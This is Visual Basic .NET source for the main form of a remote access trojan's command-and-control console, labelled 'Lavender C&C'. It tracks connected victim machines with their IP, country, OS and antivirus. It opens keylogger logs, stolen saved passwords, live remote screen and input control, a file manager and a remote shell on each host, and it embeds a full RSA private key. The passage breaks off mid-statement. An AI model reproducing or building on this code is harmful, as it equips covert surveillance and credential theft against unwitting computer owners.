﻿Imports System.Net
Imports System.Net.Sockets
Imports MaxMind.GeoIP2
Imports System.IO
Imports System.Text
Imports System.Runtime.InteropServices
Imports System.Windows.Forms.ListView

Public Class Main

#Region "Initial Vars"
    ''' <summary>
    ''' Command variable values
    ''' </summary>
    Public Shared n As New N
    ''' <summary>
    ''' Data separator
    ''' </summary>
    Public Shared Sep As String = n.splitmain ''Separator
    ''' <summary>
    ''' Can the application be closed (everything closed)
    ''' </summary>
    Public CanClose As Boolean = True
    ''' <summary>
    ''' General tick timer
    ''' </summary>
    Public WithEvents Second As New Timer
    ''' <summary>
    ''' Server instance
    ''' </summary>
    Public WithEvents S As SocketServer
    ''' <summary>
    ''' Clients
    ''' </summary>
    Public Shared Clients As New List(Of Client) ''todo: =nothing
    ''' <summary>
    ''' Number of clients
    ''' </summary>
    Public clientcount As Integer = 0
    ''' <summary>
    ''' Info label timeout
    ''' </summary>
    Dim infotimeout As Integer
    ''' <summary>
    ''' Folder with application exe
    ''' </summary>
    Public cfr As String = My.Application.Info.DirectoryPath
    ''' <summary>
    ''' Current client's ID
    ''' </summary>
    Public cid As String ''current id
    ''' <summary>
    ''' Current client's file folder
    ''' </summary>
    Public cidf As String
    ''' <summary>
    ''' Current keylogger file
    ''' </summary>
    Public klf As String
    ''' <summary>
    ''' Profiles folder
    ''' </summary>
    Public pf As String
    ''' <summary>
    ''' Current profile folder
    ''' </summary>
    Public cpf As String
    ''' <summary>
    ''' Profiles Array
    ''' </summary>
    Public Shared pfs As String()
    ''' <summary>
    ''' Current RSA private key
    ''' </summary>
    Public cpk As String = "<RSAKeyValue><Modulus>oQS+MurZhAp2kYh7VWeyMZrwYmmpW5GYW+WW2V74YZqobBYkD6gTnI0XfOL2NRtv46IgYPZvB7mWG7af+hAYkb+0uUu/8DGJ2VAV1AyEKAzrv0bzXk10n28npYuE5jBvACl1Im+LNG8lgcNZe8AkPa1eVN6HrziD8GDgF+Ib+XCnUcA3piFf3mleVvyK2svUO2dFb2rYJTLpnIRkHHlO9wSbHIT51hcMmy9mZIG/O2xR7smtKHwEDFDIUor6BhCiWM2BBcHPzQEcL7qBL1Tie9Kd8CAB2YMRybaEWvU1rS1WNf+CBN2eWNGd3H5GTn8enZjG5szr7C5UV8HYDRPUGrnTsfVUUVQKKnn+DR4RusegfsWLCuIhfKkrZZWDmhw/WWgZWiAvbNl51rsqD1Cr8ILcOTgaOztXSoC0NkVCzDiNIqqeSZ+LhT+ML8G3TLe0C2noYomBEcG2QogC462dgT7mTO0OYaUnhV9DTiU0pPj9bXYfotnL0sLPM/FXBTK3O41resBiEeOKi2qMHsIQCyNRY7PnuFeb/y7MMWv+QPpGlcZoiN6t8ntoIZlYSdmVaAy8qOVs0Vfh8ZICXjkvmv68JnSCCOezbjxMOCiVbTpxxcDKThom1Km6n3gBOhuZjd6QJeXZwnQBpsKRcFD0UxkzlltaMFPItu3RyhAI/90=</Modulus><Exponent>AQAB</Exponent><P>w69HSoJX4ODudjPE4Kf63tsZ1TtcnHHE2DDpf9VRxto1zN8+0h+C/G4NQdELczcUfyhInVTXTbkSQSmHT8rpl7YEWZyAcXTeNSdTFYMqpMhpDDMomF5qnQbAEqpMCX9md3OY+qCm4qVv2r0m7wgKPdY3b8igFbYxllvy+ZQkPUFUAuzqeCSHRTA4hx966MbR01tVL87q+VqwYnQy8zEU/dg3ORYjhRhItkYDJ8wVJbPYlb7eFq0Scug85PTtZA8+mTFNDL4NBCQ2jOMthOPUsg5m7jTn3xjv3wJN7t5P3rEqsaFFehh9gioucBwdKasbnJNeU7yCKpD9mhm0hhGtsw==</P><Q>0qYXoK2MQHaKDcrfBp5P2GKY7CGvik2nmPiZIaIH8Bqx3pu8FQ15kU5ftwaxlsGY2OlBlwRNadTguiuZwZ/OdxJEvW4Qtor6CukPfw4nMhnwYKxgDaYXs5UVORa3DhD1/Nj26DvuPZuZ+6eUVHD+YntsnWwf8aZl+79MtLDskO3EqOZO3owTbI84J6Apg9loEfEJhnJmKEMGX1BZqbcJuhNGik1PU+KgSQaIVOe9yahP2c/1OB2c345sb41ldeBGhC/sFpOsebBY/rDdeueFybCvbkCnsm+9ryflEV1zcnKRzvpebR5m5Yg6i8cWkUkgZR6w2z6Pmhw45CYdVxd0Lw==</Q><DP>dkj6YAigFDgDDQJIDMCdfZ6VY/ZpCcwff8s5KeOJdhkrEjcUIzGXHP1tGA7DzBZMVnzEQA4rwziO10LCHzJ5txH4WS6n2W0acKjfqQ5LdaYLEavO6yOPcHHHIsE8CzWue6Atpbn8ht4X2fIimbSTdEOL6Q8t7VHfcZMNMV4h9cEKhmYtaQgzmFgIo20c/55G8Wqw+KAsGyR9oFW7ApP1q2fKIcDHIcnHEh8KA0FyuwKWdhYU60Ic98Z4ILII2UX5weIyP/SVq540Nz+PoVeSlzrrbywdyRaq0HP1JeHOB7+yHgNtGtu46jiTL4NfAXQD0cam6xj02cQg98h3/d6rzw==</DP><DQ>J4ZkvpBx1ZKoesgLKwm/f6GYgg4cCv5hKTHUQdxOUv4fS9663tRlcB9dlFEcN2ZiEKlL1lNHV0lLVYNi2VLsAama3lRtrGLNYgizEKsOLbdyRCFz8HuuzNJ3ZfveIzSJg4UOZyr/m+27ad3a1jFRehcgnTUxlT0cu6z8bpcX/GWw1eRI/jcYWfFRnxXNVGERxvQMTn7erkVNR8si19Zxa8m8Ha096kaGvs0L/apyEQmU2hDMOVhNHCF0NUY5uHF5qcn4KZBR949gU4HKPQp+LwcJE83r6W5QEDKTJ7v6MopO06Bk4WKn+f+ixKF5mY84FeE5XBoUBd2vyxdfv/y1nw==</DQ><InverseQ>hJOgraplojNz++cqefChHWb2BxmqkeH4SlTy9mMfLbKG0v3caofKBOHzvykbeRwoqtBxojipf43XsAo1bFfp2mU0Guv8leicWlwYmP9HX3IsekJb469v2Q/EgUYw3ySCCQw4uMRz+euKKWvJGpOOzPv1yY5eqIHfbSst/6hfBP4gkx6IKaSsh5zguM7UNs7nCdBCE1qinSHsHrGOCJ8E6yJqpnsHx3kYOxQEVxBEAGX6n87lerW5zoVHtDrGlrT6zt7C9dzNFWIjAWm8RWb33PxVCqc/SfKaPTs/QSbPXGGiNrv1BvuvbBwc8kqD1OQaNl2XuN63Kc9zsPGHAYvzew==</InverseQ><D>CcMlQPMKLKSk9N5G4MuzrkKlj/uCzOfYsLs/vrGwv3VgAFJrVBbg1+oAYlr98Gq+CUzhrhJ8ctLZ4TF2WFpN39a1DB+/ZSTe8n6V6p0dQH+TP3qVJykgO/zCQgAufSiy+8CHtuz3J9h63qr+xUj5KYaJJJe4hEAZ7iLORpE35V/i7rFUiACYAZhD1v3ivhc2wkJybEN/E7cXGmoDo9JON+qSLCCuNECB5cElWEyhhBnLvrCz8rNqKQQw0QhW1k1MR02jJLuc1kh0WNRzuda2Q8MzCviPaoxoZK42YhYuorxDJAaRiUTI5Lur8k7zNkkj8wwgBKUOwx5sw94fZwbGIjjYeaWXLDCAGXGmHAJT3T+xFCUT7Z2XLKj1b4W6XgeGHVU0b00gJiABcOSnykM54ewGc9jEOStuTQPrp6s7NSW/JvqsLYMmxCtaA/uLxPHvSypIAhkPvg0ICPCeHquAsObzrglsyxvEcyyK/T7GxowXUwb6AelRdk/Vz6Zm86x9fUsa+93lNSo4rsgNQqsXzdWqLXF8SEYQXHwq+kWjIudnaUV6ZnZozD3RC/RBAgPhyq1d6dUDKXevCtpnsmJpAUQzfhXt2hkiIQ0RbY0YJOcyicqJQZZvRRG5W0ou5Hl4uspGfvP2reqMvcMXYNouhGsX0exq+L0jPrgE+Py+PYU=</D></RSAKeyValue>" ''current private key



#End Region

    Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        WriteToLog("Exiting application")
        My.Settings.Save()
        ErrorLabel.Text = "Exiting"
        For Each x As ListViewItem In L1.Items
            S.Disconnect(x.ToolTipText)
        Next
        S.stops()
        Application.Exit()
    End Sub


    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        S = New SocketServer
        'Turn on the update timer
        Second.Enabled = True
        Second.Interval = 100
        Second.Start()
        ErrorLabel.Text = ""
        Tabs.Visible = False
        Tabs.SelectedTab = CoreTab
        pf = cfr & Path.DirectorySeparatorChar & "profiles"
        Try
            Dim di As New DirectoryInfo(pf)
            If Not di.Exists Then
                di.Create()
            End If
        Catch ex As Exception
            MsgBox("Profiles folder could not be created!" & vbNewLine & ex.Message)
        End Try
        'For Each address In Dns.GetHostEntry(Dns.GetHostName).AddressList
        '    WriteToLog(address.ToString)
        'Next
        MainDataSet.Settings.Rows.Add(New String() {1, "test"})
        MainDataSet.Settings.NewRow()
        MainDataSet.AcceptChanges()
        WriteToLog("Application started")
    End Sub

    ''' <summary>
    ''' Disable controls on client's forms that can communicate with the client
    ''' </summary>
    ''' <param name="sock">Form socket</param>
    Public Sub FreezeForms(ByVal cli As Client)
        Try
            If My.Application.OpenForms(n.opentaskman & cli.ID) IsNot Nothing Then
                Dim f As TaskMan = My.Application.OpenForms(n.opentaskman & cli.ID)
                disc(f.CMenu)
                disc(f.KillButton)
                disc(f.RefreshButton)
                disc(f.NewButton)
            End If
            If My.Application.OpenForms(n.openklog & cli.ID) IsNot Nothing Then
                Dim f As KeyLogger = My.Application.OpenForms(n.openklog & cli.ID)
                disc(f.RefreshButton)
                disc(f.ClearButton)
            End If
            If My.Application.OpenForms(n.openutil & cli.ID) IsNot Nothing Then
                Dim f As Utilities = My.Application.OpenForms(n.openutil & cli.ID)
                disc(f)
            End If
            If My.Application.OpenForms(n.openpasswords & cli.ID) IsNot Nothing Then
                Dim f As Passwords = My.Application.OpenForms(n.openpasswords & cli.ID)
                ''Nothing for now
            End If
            If My.Application.OpenForms(n.openscreen & cli.ID) IsNot Nothing Then
                Dim f As Remote = My.Application.OpenForms(n.openscreen & cli.ID)
                disc(f.ToggleButton)
                disc(f.M)
                disc(f.C1)
                disc(f.C2)
                disc(f.C)
                disc(f.LinesCheckBox)
                disc(f.MouseCheckBox)
                disc(f.KeyboardCheckBox)
            End If
            If My.Application.OpenForms(n.openfileman & cli.ID) IsNot Nothing Then
                Dim f As FileManager = My.Application.OpenForms(n.openfileman & cli.ID)
                disc(f.HomeButton)
                disc(f.RefreshButton)
                disc(f.UpButton)
                disc(f.GoButton)
                disc(f.DirTextBox)
                disc(f.FileContextMenuStrip)
            End If
            If My.Application.OpenForms(n.openshell & cli.ID) IsNot Nothing Then
                Dim f As Shell = My.Application.OpenForms(n.openshell & cli.ID)
                disc(f.CommandTextBox)
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    ''' <summary>
    ''' Disable a control
    ''' </summary>
    ''' <param name="c">Control to disable</param>
    Private Sub disc(ByVal c As Control)
        c.Enabled = False
    End Sub

    ''' <summary>
    ''' Timer
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    Private Sub Second_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Second.Tick
        ''Get port from settings
        If Spinner.Visible = True Then
            ''MainInfoLabel.Text = L1.Items.Count & " Client(s) online"
        Else
            ''MainInfoLabel.Text = ""
        End If
    End Sub

    ''' <summary>
    ''' Print message to the log
    ''' </summary>
    ''' <param name="message">Message to print</param>
    Public Sub WriteToLog(ByVal message As String)
        Dim oo = My.Computer.Clock.LocalTime
        LogTextBox.AppendText("[" & oo.Year & "/" & oo.Month & "/" & oo.Day & " " & New String(oo.Hour.ToString).PadLeft(2, "0") & ":" & New String(oo.Minute.ToString).PadLeft(2, "0") & ":" & New String(oo.Second.ToString).PadLeft(2, "0") & "] " & message & vbNewLine)
        ''TODO: scroll to bottom
    End Sub

#Region "Server Events"
    ''' <summary>
    ''' Handles client disconnect
    ''' </summary>
    ''' <param name="sock">Socket</param>
    ''' <remarks></remarks>
    Sub Disconnect(ByVal sock As Integer) Handles S.DisConnected
        Try
            Dim cli As Client = Clients.Find(Function(x) x.Socket = sock)
            clientcount -= 1
            WriteToLog("Client """ & cli.ID & """ disconnected")
            L1.Items(sock.ToString).Group = L1.Groups.Item(1)
            FreezeForms(cli)
            Clients.Remove(cli)
            If L1.SelectedItems.Count >= 1 Then
                For Each x As ListViewItem In L1.SelectedItems
                    If x.Group Is L1.Groups.Item(1) Then
                        Tabs.Enabled = False
                        Tabs.Visible = False
                    End If
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub
    ''' <summary>
    ''' Handles client connect
    ''' </summary>
    ''' <param name="sock">Socket</param>
    ''' <remarks></remarks>
    Sub Connected(ByVal sock As Integer) Handles S.Connected
        Try
            clientcount += 1
            Dim cl As New Client(Nothing, sock, Nothing, False)
            Clients.Add(cl) ''Add client to list (untrusted)
            S.Send(cl, n.connect) ' Authentication initalization
        Catch ex As Exception
            MsgBox(ex.StackTrace)
        End Try

    End Sub

    Delegate Sub _Datad(ByVal info As Data)
    ''' <summary>
    ''' Handles data recieved from clients?
    ''' </summary>
    ''' <param name="info">Data</param>
    ''' <remarks></remarks>
    Sub data(ByVal info As Data) Handles S.Datad
        Dim a As String = info.GetData
        Dim aa As String() = a.Split("|")
        Select Case aa(0)
            Case "tt" ''is this error?
                MsgBox("Error") ''TODO: Improve
        End Select
    End Sub

    ''Dim clients As New 

    Delegate Sub _Data(ByVal sock As Integer, ByVal B As Byte())
    ''' <summary>
    ''' Handles commands/data recieved from clients
    ''' </summary>
    ''' <param name="sock">Socket</param>
    ''' <param name="B">Data as bytes</param>
    ''' <remarks></remarks>
    Public Sub Data(ByVal sock As Integer, ByVal B As Byte()) Handles S.Data
        Dim cli As Client = Clients.Find(Function(item) item.Socket = sock) ''predicate lambda oh yeah
        Dim T As String ''recieved data
        If cli Is Nothing Then
            MsgBox("Client not found!", MsgBoxStyle.Critical, "Error")
            Exit Sub
        End If
        If cli.Trusted And Not BS(B).StartsWith(n.getscreen) Then
            T = cli.Cryptor.Decrypt(BS(B), cli.Key) ''Decrypt recieved data
        Else
            T = BS(B)
        End If
        Dim A As String() = Split(T, Sep)
        Try
            Select Case A(0)
                Case n.exception
                    For i As Integer = 0 To L1.Items.Count - 1
                        If L1.Items.Item(i).SubItems(1).Text = S.IP(sock) Then
                            MsgBox(A(1), MsgBoxStyle.Critical, "Exception @ (" & L1.Items.Item(i).SubItems(0).Text & ")")
                            Exit For
                        End If
                    Next
                Case n.connect ''authentication check
                    Dim rk As Crypt.RSAResult = New Crypt.RSAResult(Convert.FromBase64String(A(1)))
                    Dim ts As String = Crypt.RSA.Decrypt(rk.AsBytes, cpk).AsString
                    cli.ID = Split(ts, Sep)(0) ''Set client's name
                    cli.Key = Split(ts, Sep)(1) ''Set client session encryption password
                    cli.Cryptor = New Crypt.Aes256Base64Encrypter(cli.ID) ''Set up cryptor with salt as client name
                    S.Send(cli, n.response & Sep & Crypt.HMACSHA512Hasher.Base64Hash(cli.Key))
                Case n.response ''successfully authenticated
                    cli.Trusted = True
                    S.Send(cli, n.getinfo) ''Get PC Name/info
                Case n.getinfo ' Client Sent the PC name/info
                    Dim L As ListViewItem = Nothing
                    For i As Integer = 0 To L1.Items.Count - 1
                        If L1.Items.Item(i).SubItems(0).Text = cli.ID Then
                            L = L1.Items.Item(i)
                            L.Name = cli.Socket
                            Exit For
                        End If
                    Next
                    If L Is Nothing Then
                        L = L1.Items.Add(cli.Socket.ToString, A(1), GetCountryNumber(UCase(A(3))))
                        ''L.Tag
                    End If

                    L.ImageKey = "zz.png"
                        L.SubItems.Add(S.IP(sock)) ''ip
                        L.SubItems.Add(A(2)) ''computer/user

                        ''L.SubItems.Add(A(3)) ''country
                        Try
                            Using rdr As New DatabaseReader("GeoLite2-Country.mmdb")
                                L.SubItems.Add(rdr.Country(S.IP(sock)).Country.Name)
                            L.ImageKey = rdr.Country(S.IP(sock)).Country.IsoCode & ".png"
                            ''rdr.
                        End Using
                        Catch ex As Exception
                            L.ImageKey = "zz.png" ''TODO: country to ISO
                            If S.IP(sock).StartsWith("192.168.") Or S.IP(sock).StartsWith("10.") Or S.IP(sock).StartsWith("172.16.") Or S.IP(sock).StartsWith("127.0.0.1") Or S.IP(sock).StartsWith("localhost") Then
                                L.SubItems.Add("LAN")
                            Else
                                L.SubItems.Add("(" & A(3) & ")")
                            End If
                        End Try

                        L.SubItems.Add(A(4)) ''os
                        L.SubItems.Add(A(5)) ''antivirus
                        L.SubItems.Add(" ") ''active windows
                        L.Group = L1.Groups.Item(0)
                        L.ToolTipText = sock

                        ''show tooltip
                        TrayIcon.BalloonTipIcon = ToolTipIcon.Info
                    TrayIcon.BalloonTipTitle = "Lavender C&C"
                    Using rdr As New DatabaseReader("GeoLite2-Country.mmdb")
                        TrayIcon.BalloonTipText = "Client connected: [ ID : " & A(1) & " IP : " & S.IP(sock) & " Country : " & rdr.Country(S.IP(sock)).Country.Name & " ]"
                        ''rdr.
                    End Using

                    TrayIcon.ShowBalloonTip(1)

                    WriteToLog("Client """ & A(1) & """ connected")
                Case n.activewindow ''active window
                    For i As Integer = 0 To L1.Items.Count - 1
                        If L1.Items.Item(i).SubItems(1).Text = S.IP(sock) Then
                            L1.Items.Item(i).SubItems(6).Text = A(1)
                            Exit For
                        End If
                    Next
                Case n.status
                    For i As Integer = 0 To L1.Items.Count - 1
                        If L1.Items.Item(i).SubItems(1).Text = S.IP(cli.Socket) Then
                            If A(1) = 0 Then
                                L1.Items.Item(i).BackColor = Color.White
                            Else
                                L1.Items.Item(i).BackColor = Color.LightYellow
                            End If
                            Exit For
                        End If
                    Next
                Case n.plugin ''success recieving plugin
                    S.Send(cli, A(1)) ''todo
                Case "F" ''file run?
                    For i As Integer = 0 To L1.Items.Count - 1
                        If L1.Items.Item(i).SubItems(1).Text = S.IP(cli.Socket) Then
                            L1.Items.Item(i).ForeColor = Color.Black
                            Exit For
                        End If
                    Next
                Case n.opentaskman ''open taskmanager
                    If My.Application.OpenForms(n.opentaskman & cli.ID) IsNot Nothing Then Exit Sub ''test if taskman for socket already open
                    If Me.InvokeRequired Then ''???
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New TaskMan
                    f.cli = cli
                    f.Name = n.opentaskman & cli.ID ''name of new taskman
                    f.Text = f.Text & cli.ID ''title += ip
                    f.Show() ''show taskman
                Case n.openklog ''open keylogger window
                    If My.Application.OpenForms(n.openklog & cli.ID) IsNot Nothing Then Exit Sub ''test if logs for socket already open
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New KeyLogger
                    f.cli = cli
                    f.Name = n.openklog & cli.ID ''name of new window
                    f.Text = f.Text & cli.ID ''title += ip
                    f.Show() ''show
                Case n.getklog ''set keylogger texbox to keylogs
                    Dim F As KeyLogger = My.Application.OpenForms(n.openklog & cli.ID) ''find window from socket
                    If F Is Nothing Then Exit Sub
                    klf = cidf & Path.DirectorySeparatorChar & "keylogs.html"
                    Dim final As String = A(1)
                    final = A(1).Insert(0,
"<!doctype html>
<html style=""font-family: Segoe UI, Helvetica Neue, Arial, sans-serif;"">
<head>
<meta http-equiv=""Content-Type"" content=""text/html; charset=UTF-8""/>
<meta http-equiv=""X-UA-Compatible"" content=""IE=edge, chrome=1"">
<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
<title>" & L1.Items(sock.ToString).SubItems(2).Text & " | " & cli.ID & " (" & S.IP(sock) & ")</title>
</head>
<body>
<style>.k {color:#080;} .f{color:#F80;} .content{word-wrap:break-word;white-space:-moz-pre-wrap;white-space:pre-wrap}</style>
<h1 style=""text-align:center; color: #B07;"">" & L1.Items(sock.ToString).SubItems(2).Text & " | " & cli.ID & "(" & S.IP(sock) & ")</h1>
<div class=""content"">")
                    final = final.Insert(final.Length, "
</div>
</body>
<html>")
                    IO.File.WriteAllText(klf, final, Encoding.UTF8) ''write keylogs to file
                    F.WebBrowser.DocumentText = IO.File.ReadAllText(klf).ToString ''set browser component to log file
                    F.WebBrowser.Invalidate()
                ''F.WebBrowser.Document.Body.ScrollIntoView(False)
                Case n.delklog
                    MsgBox("Logs deleted from host")
                Case n.openfileman
                    If My.Application.OpenForms(n.openfileman & cli.ID) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New FileManager
                    fm.cli = cli
                    fm.Name = n.openfileman & cli.ID
                    fm.Text = fm.Text & cli.ID
                    fm.Show()
                Case n.openutil ''utilities
                    If My.Application.OpenForms(n.openutil & cli.ID) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New Utilities
                    fm.cli = cli
                    fm.Name = n.openutil & cli.ID
                    fm.Text = fm.Text & cli.ID
                    fm.f = Me
                    fm.Show()
                Case n.openpasswords ''saved passwords
                    If My.Application.OpenForms(n.openpasswords & cli.ID) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New Passwords
                    fm.uname = sock
                    fm.Name = n.openpasswords & cli.ID
                    fm.Text = fm.Text & cli.ID
                    fm.Show()
                    S.Send(cli, n.getpasswords)
                Case n.openscreen ' i recive size of client screen
                    ' lets start Cap form and start capture desktop
                    If My.Application.OpenForms(n.openscreen & cli.ID) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New Remote
                    f.F = Me
                    f.cli = cli
                    f.Name = n.openscreen & cli.ID
                    f.Sz = New Size(A(1), A(2))
                    For Each s As String In Split(A(3), n.splitalt) ''all monitors
                        If Not String.IsNullOrEmpty(s) Then
                            f.M.Items.Add(s)
                        End If
                    Next
                    f.Show()
                Case n.changescreen
                    Dim F As Remote = My.Application.OpenForms(n.openscreen & cli.ID)
                    If F Is Nothing Then Exit Sub
                    F.Sz = New Size(A(1), A(2))
                    F.clear()
                    S.Send(cli, Main.n.clearscreen)
                Case n.getscreen ' recieve screen
                    Dim F As Remote = My.Application.OpenForms(n.openscreen & cli.ID)
                    If F Is Nothing Then Exit Sub
                    If A(1).Length = 1 Then
                        If Not F.changes = "None" Then
                            F.changes = "None"
                            F.filesize = siz(B.Length)
                            F.UpdateInfo(False)
                        End If
                        S.Send(cli, n.getscreen & Sep & F.C1.SelectedIndex & Sep & F.C2.Text & Sep & F.C.Value)
                        Exit Sub
                    End If
                    Dim BB As Byte() = fx(B, n.getscreen & Sep)(1)
                    F.PktToImage(BB)
                Case n.getfileman
                    Dim fff As FileManager = My.Application.OpenForms(n.openfileman & cli.ID)
                    If A(1) = "Error" Then
                        fff.FileListView.Items.Clear()
                        fff.FileListView.Items.Add("Access Denied")
                        fff.donewait()
                    Else
                        Dim allFiles As String() = Split(A(1), n.splitalt) ''CHANGE!
                        If fff.IsHandleCreated Then
                            fff.FileListView.Items.Clear()
                            fff.FileListView.Items.Add("Populating list...")
                            fff.FileListView.BeginUpdate() ''freezes list until endupdate()
                            fff.FileListView.Items.Clear()
                            Dim icons() As Image
                            Dim iconsi As Integer = 0
                            Dim hasicons As Boolean = False

                            For i = 0 To allFiles.Length - 2
                                Dim itm As New ListViewItem
                                itm.Text = allFiles(i)
                                itm.SubItems.Add(allFiles(i + 1))
                                If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Rem]") And Not itm.Text.StartsWith("[Folder]") Then
                                    Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
                                    If fsize > 1073741824 Then
                                        Dim size As Double = fsize / 1073741824
                                        itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
                                    ElseIf fsize > 1048576 Then
                                        Dim size As Double = fsize / 1048576
                                        itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
                                    ElseIf fsize > 1024 Then
                                        Dim size As Double = fsize / 1024
                                        itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
                                    Else
                                        itm.SubItems(1).Text = fsize.ToString & " B"
                                    End If
                                    itm.Tag = Convert.ToInt64(allFiles(i + 1))
                                End If

                                If itm.Text.StartsWith("[Drive]C") Then
                                    itm.ImageIndex = 1
                                    itm.Text = itm.Text.Substring(7)
                                    itm.SubItems.Add("Windows Disk")
                                ElseIf itm.Text.StartsWith("[Drive]") Then
                                    itm.ImageIndex = 0
                                    itm.Text = itm.Text.Substring(7)
                                    itm.SubItems.Add("Local Disk")
                                ElseIf itm.Text.StartsWith("[Rem]") Then
                                    itm.ImageIndex = 0
                                    itm.Text = itm.Text.Substring(5)
                                    itm.SubItems.Add("Removable Disk")
                                ElseIf itm.Text.StartsWith("[CD]") Then
                                    itm.ImageIndex = 2
                                    itm.Text = itm.Text.Substring(4)
                                    itm.SubItems.Add("Disk Drive")
                                ElseIf itm.Text.StartsWith("[Folder]") Then
                                    itm.ImageIndex = 3
                                    itm.Text = itm.Text.Substring(8)
                                    itm.SubItems.Add("DIR")
                                Else
                                    hasicons = True
                                    If itm.Text.ToLower.EndsWith(".exe") Then
                                        itm.SubItems.Add("Application")
                                    ElseIf itm.Text.ToLower.EndsWith(".zip") Or itm.Text.ToLower.EndsWith(".rar") Or itm.Text.ToLower.EndsWith(".7z") Or itm.Text.ToLower.EndsWith(".bz2") Or itm.Text.ToLower.EndsWith(".tar") Or itm.Text.ToLower.EndsWith(".tar.gz") Then
                                        itm.SubItems.Add("Archive")
                                    ElseIf itm.Text.ToLower.EndsWith(".msi") Then
                                        itm.SubItems.Add("Windows Installer Package")
                                    ElseIf itm.Text.ToLower.EndsWith(".rtf") Or itm.Text.ToLower.EndsWith(".txt") Then
                                        itm.SubItems.Add("Text Document")
                                    ElseIf itm.Text.ToLower.EndsWith(".dll") Then
                                        itm.SubItems.Add("Application Extension")
                                    ElseIf itm.Text.ToLower.EndsWith(".reg") Then
                                        itm.SubItems.Add("Registration Entries")
                                    ElseIf itm.Text.ToLower.EndsWith(".jpg") Or itm.Text.ToLower.EndsWith(".jpeg") Or itm.Text.ToLower.EndsWith(".tif") Then
                                        itm.SubItems.Add("JPG File")
                                    ElseIf itm.Text.ToLower.EndsWith(".gif") Then
                                        itm.SubItems.Add("GIF File")
                                    ElseIf itm.Text.ToLower.EndsWith(".png") Then
                                        itm.SubItems.Add("PNG File")
                                    ElseIf itm.Text.ToLower.EndsWith(".bmp") Then
                                        itm.SubItems.Add("BMP File")
                                    ElseIf itm.Text.ToLower.EndsWith(".doc") Or itm.Text.ToLower.EndsWith(".docx") Or itm.Text.ToLower.EndsWith(".docm") Or itm.Text.ToLower.EndsWith(".odt") Then ''add iconz!!
                                        itm.SubItems.Add("Word Document")
                                    ElseIf itm.Text.ToLower.EndsWith(".ppt") Or itm.Text.ToLower.EndsWith(".pptx") Or itm.Text.ToLower.EndsWith(".pptm") Or itm.Text.ToLower.EndsWith(".ppsx") Or itm.Text.ToLower.EndsWith(".odp") Then
                                        itm.SubItems.Add("PowerPoint Presentation")
                                    ElseIf itm.Text.ToLower.EndsWith(".xls") Or itm.Text.ToLower.EndsWith(".xlsx") Or itm.Text.ToLower.EndsWith(".xlsm") Or itm.Text.ToLower.EndsWith(".xlsb") Or itm.Text.ToLower.EndsWith(".ods") Then
                                        itm.SubItems.Add("Excel Worksheet")
                                    ElseIf itm.Text.ToLower.EndsWith(".pdf") Then
                                        itm.SubItems.Add("PDF")
                                    ElseIf itm.Text.ToLower.EndsWith(".html") Or itm.Text.ToLower.EndsWith(".htm") Then
                                        itm.SubItems.Add("HTML Document")
                                    ElseIf itm.Text.ToLower.EndsWith(".wav") Or itm.Text.ToLower.EndsWith(".mp3") Or itm.Text.ToLower.EndsWith(".midi") Or itm.Text.ToLower.EndsWith(".mdi") Or itm.Text.ToLower.EndsWith(".m4a") Or itm.Text.ToLower.EndsWith(".aiff") Or itm.Text.ToLower.EndsWith(".flac") Or itm.Text.ToLower.EndsWith(".mka") Or itm.Text.ToLower.EndsWith(".aac") Or itm.Text.ToLower.EndsWith(".aif") Or itm.Text.ToLower.EndsWith(".cda") Or itm.Text.ToLower.EndsWith(".m4a") Or itm.Text.ToLower.EndsWith(".ogg") Then
                                        itm.SubItems.Add("Audio File") ''
                                    ElseIf itm.Text.ToLower.EndsWith(".flv") Or itm.Text.ToLower.EndsWith(".avi") Or itm.Text.ToLower.EndsWith(".mts") Or itm.Text.ToLower.EndsWith(".3gp") Or itm.Text.ToLower.EndsWith(".mkv") Or itm.Text.ToLower.EndsWith(".mov") Or itm.Text.ToLower.EndsWith(".mp4") Or itm.Text.ToLower.EndsWith(".mpeg") Or itm.Text.ToLower.EndsWith(".mpg") Or itm.Text.ToLower.EndsWith(".webm") Then
                                        itm.SubItems.Add("Video File")
                                    ElseIf itm.Text.ToLower.EndsWith(".jar") Then
                                        itm.SubItems.Add("Excecutable Jar File")
                                    ElseIf itm.Text.ToLower.EndsWith(".bat") Then
                                        itm.SubItems.Add("Batch File")
                                    Else
                                        Dim ii As String() = itm.Text.Split(".")
                                        itm.SubItems.Add(ii(ii.Length - 1).ToUpper & " File") ''last text after period = extension
                                    End If
                                    ''fff.ImgList.Images.Add(Convert.ToBase64String(Icon.ExtractAssociatedIcon(itm.Text)))
                                    If Not allFiles(i + 2) = "x" Then ''if not x for no icon then get icon C:\Users\Henry\Documents\Output
